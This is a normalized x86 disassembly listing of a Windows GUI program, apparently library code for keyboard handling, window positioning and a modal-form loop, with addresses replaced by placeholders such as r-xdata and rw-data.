lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_4504d0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_4504fc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43982c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44e50c
lea edx [ ebp - 0x14 ]
call sub_451cd4
push ebp
mov eax [ ebp - 0x4 ]
call sub_44e50c
lea edx [ ebp - 0x24 ]
call sub_451cd4
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_4504d0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_44e50c
lea edx [ ebp - 0x24 ]
call sub_451cd4
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_4504d0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4504d0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4504d0
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_4505b4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4032f4
pop esi
pop ebx
retn
sub_4505d8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_4032f4
pop esi
pop ebx
retn
sub_4505fc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_43a70c
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_43b7c4
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_43b7c4
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_450698
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450c02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_454dac
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_450be5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450bec
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
xor eax eax
push ebp
push sub_450aec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4032f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_403580#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4032f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44f844
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4387e8
jmp r-xdata
mov eax [ rw-data ]
call sub_451f30
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434494
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43b290
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_451f24
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4344d8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b290
call sub_44b4a8
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_451f60
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434494
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_451f30
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_434cf0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_451f54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4344d8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_451f24
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_44eaf4
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44eaf4
jmp r-xdata
sub_450755
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4544c0
call sub_4038e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_451f30
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434494
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_451f24
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4344d8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_451f60
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434494
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_451f30
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450bec
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_434cf0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_451f54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4344d8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_451f24
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_44eaf4
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44eaf4
jmp r-xdata
sub_450af1
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4544c0
call sub_4038e8
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44f844
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4387e8
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43b290
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450bec
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b290
call sub_44b4a8
mov ebx eax
sub_450c38
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_450c90
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450cee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_450cfc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_4032f4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_450d28
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4544ac
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_4032f4
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_450ec8
jmp r-xdata
mov eax ebx
call sub_450f64
mov dl 0x1
mov eax ebx
call sub_44eab4
jmp r-xdata
sub_450dcc
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_44e440
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_44e48c
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_450e30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403580#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4032f4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_450f64
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450ee8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_450f56
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450f5d
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_44f740
sub_450f80
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451248
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4332f0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_453420
xor edx edx
push ebp
push sub_45122b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_413a70
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_452450
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_44b358
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_451209
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_450ed0
xor edx edx
push ebp
push sub_451168
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_450e30
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45422c
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_43b290
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45116f
mov eax [ ebp - 0x4 ]
call sub_450ec8
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45116f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451213
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_452450
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_452450
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4139ec
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_413b90
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44b40c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
